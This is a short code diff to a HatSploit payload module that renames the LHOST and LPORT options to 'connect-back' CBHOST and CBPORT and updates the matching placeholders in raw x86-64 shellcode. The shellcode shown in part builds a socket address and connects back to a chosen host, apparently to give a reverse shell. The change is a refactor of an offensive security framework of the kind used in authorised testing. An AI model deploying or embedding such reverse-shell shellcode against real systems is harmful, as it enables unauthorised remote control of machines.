@@ -29,14 +29,14 @@ class HatSploitPayload(Payload, HatVenom):
     }
 
     options = {
-        'LHOST': {
-            'Description': "Local host.",
+        'CBHOST': {
+            'Description': "Connect-back host.",
             'Value': TCPClient.get_local_host(),
             'Type': "ip",
             'Required': True
         },
-        'LPORT': {
-            'Description': "Local port.",
+        'CBPORT': {
+            'Description': "Connect-back port.",
             'Value': 8888,
             'Type': "port",
             'Required': True
@@ -44,11 +44,11 @@ class HatSploitPayload(Payload, HatVenom):
     }
 
     def run(self):
-        local_host, local_port = self.parse_options(self.options)
+        connback_host, connback_port = self.parse_options(self.options)
 
         offsets = {
-            'lhost': local_host,
-            'lport': local_port
+            'cbhost': connback_host,
+            'cbport': connback_port
         }
 
         shellcode = (
@@ -62,8 +62,8 @@ class HatSploitPayload(Payload, HatVenom):
             b"\x0f\x05"          # syscall
             b"\x48\x97"          # xchg   %rax,%rdi
             b"\x48\xb9\x02\x00"  # movabs $0x100007fb3150002,%rcx
-            b":lport:port:"      # port
-            b":lhost:ip:"        # ip
+            b":cbport:port:"      # port
+            b":cbhost:ip:"        # ip
             b"\x51"              # push   %rcx
             b"\x48\x89\xe6"      # mov    %rsp,%rsi
             b"\x6a\x10"          # pushq  $0x10
